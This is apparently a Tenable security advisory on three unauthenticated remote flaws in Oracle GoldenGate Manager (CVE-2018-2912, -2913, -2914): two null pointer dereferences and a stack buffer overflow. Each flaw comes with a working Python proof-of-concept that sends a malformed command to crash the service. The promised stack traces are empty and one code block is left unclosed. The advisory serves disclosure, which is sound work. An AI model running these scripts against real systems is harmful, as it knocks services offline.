# [R1] Multiple Oracle GoldenGate Manager Vulnerabilities

Critical

[← View More Research Advisories](/security/research)
### Synopsis

While researching Oracle GoldenGate, Tenable found three vulnerabilities in GoldenGate Manager. GoldenGate Manager is the process that is in charge of monitoring, controlling, and reporting status on other GoldenGate components. The Manager listens on port 7809 where it accepts GoldenGate Software Command Interface (GGSCI) commands.

#### CVE-2018-2912: Unauthenticated Remote Denial of Service

A null pointer dereference can occur if an unauthenticated remote attacker provides a malformed command in the connection initiation. Specifically, an attacker can trigger the condition by sending a *START* and *VERSION* but omitting the separating tab character. The following is a proof of concept:

```

import sys
import struct
import socket

if len(sys.argv) != 3:
    print 'Usage: ./tab_deref.py <host> <port>'
    sys.exit(0)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (sys.argv[1], int(sys.argv[2]))
print '[+] connecting to %s port %s' % server_address
sock.connect(server_address)
print '[+] sending crash text'
cmd = 'START VERSION'
length = struct.pack(">H", len(cmd))
sock.sendall(length + cmd)
print '[+] Fin.'
sock.close()

```

The proof of concept generates the following stack trace:

```

(gdb) bt

```
#### CVE-2018-2913: Unauthenticated Remote Stack Buffer Overflow

A stack buffer overflow can occur if an unauthenticated remote attacker provides a malformed command. An attacker can trigger the condition by simply sending a long command. The following is a proof of concept:

```
import sys
import struct
import socket

if len(sys.argv) != 3:
    print 'Usage: ./buffer_overrun.py <host> <port>'
    sys.exit(0)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (sys.argv[1], int(sys.argv[2]))
print '[+] connecting to %s port %s' % server_address
sock.connect(server_address)
print '[+] sending crash text'
cmd = 'Nessus\taaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
length = struct.pack(">H", len(cmd))
sock.sendall(length + cmd)
print '[+] Fin.'
sock.close()
```

The proof of concept generates the following stack trace:

```

#### CVE-2018-2914: Unauthenticated Remote Denial of Service

Another null pointer dereference can occur if an unauthenticated remote attacker provides a malformed command. The condition is triggered when an attacker sends an incomplete *REPORT* command to the server. The following is a proof of concept:

```

import sys
import struct
import socket

if len(sys.argv) != 3:
    print 'Usage: ./report_dereference.py <host> <port>'
    sys.exit(0)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (sys.argv[1], int(sys.argv[2]))
print '[+] connecting to %s port %s' % server_address
sock.connect(server_address)
print '[+] sending crash text'
cmd = 'Nessus\tREPORT'
length = struct.pack(">H", len(cmd))
sock.sendall(length + cmd)
print '[+] Fin.'
sock.close()

```
